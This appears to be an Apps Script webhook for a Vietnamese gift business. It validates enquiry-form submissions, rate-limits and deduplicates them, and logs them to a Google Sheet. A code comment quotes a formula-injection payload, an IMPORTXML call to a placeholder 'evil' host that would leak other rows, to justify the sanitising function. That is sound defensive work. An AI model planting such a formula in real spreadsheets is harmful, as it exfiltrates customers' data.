/**
 * Nhà Mai — order webhook for the Astro site (fropppy.github.io/gift-business).
 *
 * Receives the enquiry form POST, validates it, and appends a row to the
 * "Đơn hàng" sheet. Also creates the "Sản phẩm" sheet whose columns mirror
 * src/data/products.json, so the sheet can later drive the catalog.
 *
 * Setup: see apps-script/SETUP.md. Run setupSheets() once from the editor.
 */

const ORDERS_SHEET = 'Đơn hàng';
const PRODUCTS_SHEET = 'Sản phẩm';

const ORDER_HEADERS = [
  'Thời gian',
  'Mã đơn',
  'Trạng thái',
  'Tên khách',
  'SĐT / Zalo',
  'Sản phẩm quan tâm',
  'Dịp tặng & lời nhắn',
  'Trang nguồn',
  'Ghi chú nội bộ',
  'Người phụ trách',
];

const PRODUCT_HEADERS = [
  'id',
  'slug',
  'name',
  'category',
  'priceVnd',
  'options',
  'personalization',
  'image',
  'description',
  'badge',
  'inStock',
];

const STATUS_VALUES = ['Mới', 'Đang gọi', 'Đã tư vấn', 'Đã chốt', 'Đã giao', 'Huỷ'];

function doPost(e) {
  try {
    const body = JSON.parse(e.postData.contents);
    const name = String(body.name || '').trim();
    const phone = String(body.phone || '').trim();

    if (!name || !/^[0-9+ ]{9,13}$/.test(phone)) {
      return json({ ok: false, error: 'invalid name or phone' });
    }
    // Honeypot: the site hides this field from humans; a filled value is a bot.
    if (String(body.company || '') !== '') {
      return json({ ok: true, orderId: null, note: 'honeypot' });
    }

    // Per-phone rate limit — max 3 submissions per 10 minutes, checked
    // BEFORE any sheet access so a flood cannot burn URL-fetch/quota on
    // the range read or starve the script lock and fail real orders.
    // Check-then-increment is not atomic, but CacheService is enough
    // against casual spam; the dedupe below still absorbs honest retries.
    const cache = CacheService.getScriptCache();
    const rlKey = 'rl:' + phone;
    if (Number(cache.get(rlKey) || 0) >= 3) {
      return json({ ok: false, error: 'too many requests' });
    }
    cache.put(rlKey, String(Number(cache.get(rlKey) || 0) + 1), 600);

    const duplicate = findRecentDuplicate(phone, String(body.message || '').trim());
    if (duplicate) {
      return json({ ok: true, orderId: duplicate, duplicate: true });
    }

    const sheet = getOrCreateOrdersSheet();
    const orderId = nextOrderId();
    const timestamp = Utilities.formatDate(
      new Date(),
      'Asia/Ho_Chi_Minh',
      'yyyy-MM-dd HH:mm:ss',
    );
    sheet.appendRow([
      timestamp,
      orderId,
      'Mới',
      neutralize(name),
      neutralize(phone),
      neutralize(String(body.product || '')),
      neutralize(String(body.message || '')),
      neutralize(String(body.page || '')),
      '',
      '',
    ]);

    return json({ ok: true, orderId });
  } catch (err) {
    return json({ ok: false, error: String((err && err.message) || err) });
  }
}

/** Health check: GET the /exec URL and expect "ok". */
function doGet() {
  return ContentService.createTextOutput('ok');
}

/**
 * One-time setup: creates both sheets with headers, freezes the header row,
 * and attaches the Trạng thái dropdown. Safe to re-run.
 */
function setupSheets() {
  const orders = getOrCreateOrdersSheet();
  orders.getRange(2, 3, orders.getMaxRows() - 1, 1).setDataValidation(
    SpreadsheetApp.newDataValidation().requireValueInList(STATUS_VALUES, true).build(),
  );

  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let products = ss.getSheetByName(PRODUCTS_SHEET);
  if (!products) {
    products = ss.insertSheet(PRODUCTS_SHEET);
    products.getRange(1, 1, 1, PRODUCT_HEADERS.length).setValues([PRODUCT_HEADERS]);
    products.getRange(1, 1, 1, PRODUCT_HEADERS.length).setFontWeight('bold');
    products.setFrozenRows(1);
  }
}

function getOrCreateOrdersSheet() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sheet = ss.getSheetByName(ORDERS_SHEET);
  if (!sheet) {
    sheet = ss.insertSheet(ORDERS_SHEET, 0);
    sheet.getRange(1, 1, 1, ORDER_HEADERS.length).setValues([ORDER_HEADERS]);
    sheet.getRange(1, 1, 1, ORDER_HEADERS.length).setFontWeight('bold');
    sheet.setFrozenRows(1);
  }
  return sheet;
}

/** GQ-YYYYMMDD-####, one number per calendar day, persisted across runs. */
function nextOrderId() {
  const lock = LockService.getScriptLock();
  lock.waitLock(5000);
  try {
    const props = PropertiesService.getScriptProperties();
    const today = Utilities.formatDate(new Date(), 'Asia/Ho_Chi_Minh', 'yyyyMMdd');
    const state = JSON.parse(props.getProperty('orderCounter') || '{}');
    const seq = state.date === today ? Number(state.seq || 0) + 1 : 1;
    props.setProperty('orderCounter', JSON.stringify({ date: today, seq }));
    return 'GQ-' + today + '-' + ('0000' + seq).slice(-4);
  } finally {
    lock.releaseLock();
  }
}

/** Same phone + message within 5 minutes = the same submission retried. */
function findRecentDuplicate(phone, message) {
  const sheet = getOrCreateOrdersSheet();
  const last = sheet.getLastRow();
  if (last < 2) return null;
  const rows = sheet.getRange(Math.max(2, last - 20), 1, last - Math.max(2, last - 20) + 1, 7).getValues();
  for (let i = rows.length - 1; i >= 0; i--) {
    const row = rows[i];
    const phoneMatch = String(row[4]).trim() === phone;
    const messageMatch = String(row[6]).trim() === message;
    if (!phoneMatch || !messageMatch) continue;
    const submitted = new Date(String(row[0]).replace(' ', 'T') + '+07:00');
    if (Date.now() - submitted.getTime() < 5 * 60 * 1000) {
      return String(row[1]);
    }
  }
  return null;
}

/**
 * Forces text interpretation for a cell. appendRow parses values as if
 * they were typed into the UI (USER_ENTERED), so a value starting with
 * = + - @ (or tab/CR) becomes a live formula — e.g. a message of
 * '=IMPORTXML("https://evil/?q="&E2,"//x")' would exfiltrate other rows
 * the moment the family opens the sheet. The leading apostrophe is a
 * display-only text marker: the cell keeps the original characters and
 * getValues() reads them back without it (so dedupe still compares raw).
 */
function neutralize(v) {
  v = String(v || '');
  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
}

function json(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(
    ContentService.MimeType.JSON,
  );
}
